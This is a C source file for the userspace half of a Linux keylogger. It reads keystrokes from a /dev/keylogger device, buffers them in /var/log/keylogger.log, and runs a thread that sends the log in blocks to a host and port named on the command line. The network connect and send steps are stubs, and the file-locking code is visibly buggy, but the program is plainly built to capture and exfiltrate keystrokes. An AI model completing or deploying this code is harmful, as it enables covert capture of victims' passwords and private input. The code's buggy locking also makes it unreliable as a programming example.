#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/select.h>
#include <sys/file.h>
#include <string.h>

#ifndef FALLOC_FL_COLLAPSE_RANGE
#define FALLOC_FL_COLLAPSE_RANGE 0x08
#endif

#define BUFFER_SIZE 128

struct address
{
    char *host;
    int port;
};

pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;

int connect(char *host, int port)
{
    /* try to connect to server, if ok return 0 else -1*/
    return -1;
}

void * sendToServer(void *args)
{
    struct address *addr = (struct address *) args;
    int connected = 1;
    unsigned char buffer[BUFFER_SIZE];

    printf("Thread starts\n");
    while(1)
    {
        sleep(10);

        if (connected)
        {
            /* we are connected to server send log file */
            FILE *file;
            if ((file = fopen("/var/log/keylogger.log", "r")) == NULL)
            {
                /* log file doesn't exist */
                continue;
            }

            flockfile(file);

            fseek(file, 0, SEEK_END);
            if (ftell(file) < BUFFER_SIZE)
            {
                /* log file is not big enough */
                fclose(file);
                continue;
            }
            fseek(file, 0, SEEK_SET);

            int readBytes = 0;
            while (readBytes < BUFFER_SIZE)
            {
                readBytes += fread(buffer + readBytes, 1, BUFFER_SIZE - readBytes, file);
            }

            fclose(file);
            funlockfile(file);

            /* send buffer to server */
            printf("Bytes ready to send %d\n", readBytes);

            /* if send succeeded delete block of data in log file */
            file = fopen("/var/log/keylogger.log", "r");
            FILE *tmp_file = fopen("/var/log/keylogger.log~", "w");
            flockfile(file);
            fseek(file, BUFFER_SIZE, 0);
            int c;
            while((c = fgetc(file)) != EOF)
            {
                fputc(c, tmp_file);
            }
            fclose(tmp_file);
            fclose(file);
            unlink("/var/log/keylogger.log");
            rename("/var/log/keylogger.log~", "/var/log/keylogger.log");
            funlockfile(file);
            /* if send does not succeeded leave file as it was and set connected to 0 */
        }
        else if (connect(addr->host, addr->port) == 0)
        {
            connected = 1;
        }
    }
}

void logToFile(unsigned char *buffer, int *currentSize)
{
    FILE *file  = fopen("/var/log/keylogger.log", "a+");
    flockfile(file);
    int writtenBytes = 0;
    while (*currentSize - writtenBytes > 0)
    {
        writtenBytes += fwrite(buffer + writtenBytes, 1, *currentSize - writtenBytes, file);
    }
    *currentSize = 0;
    fclose(file);
    funlockfile(file);
}


int main(int argc, char *argv[])
{
    if (argc != 3)
    {
        fprintf(stderr, "Incorrect number of arguments\n");
        return 1;
    }

    struct address addr;
    addr.host = argv[1];
    addr.port = atoi(argv[2]);

    int dev_fd;
    if ((dev_fd = open("/dev/keylogger", O_RDONLY)) == -1)
    {
        fprintf(stderr, "Cannot open device\n");
        return 2;
    }

    unsigned char buffer[BUFFER_SIZE];
    int currentSize = 0;

    pthread_t sender;
    if (pthread_create(&sender, NULL, &sendToServer, (void *)&addr) != 0)
    {
        fprintf(stderr, "Cannot create thread\n");
        return 3;
    }


    while (1)
    {
        int readBytes;
        if ((readBytes = read(dev_fd, buffer + currentSize, BUFFER_SIZE - currentSize)) == -1)
        {
            fprintf(stderr, "Error reading device\n");
            close(dev_fd);
            exit(3);
        }

        currentSize += readBytes;
        printf("Read %d bytes\n", readBytes);

        if (currentSize == BUFFER_SIZE)
        {
            logToFile(buffer, &currentSize);
        }
    }
}
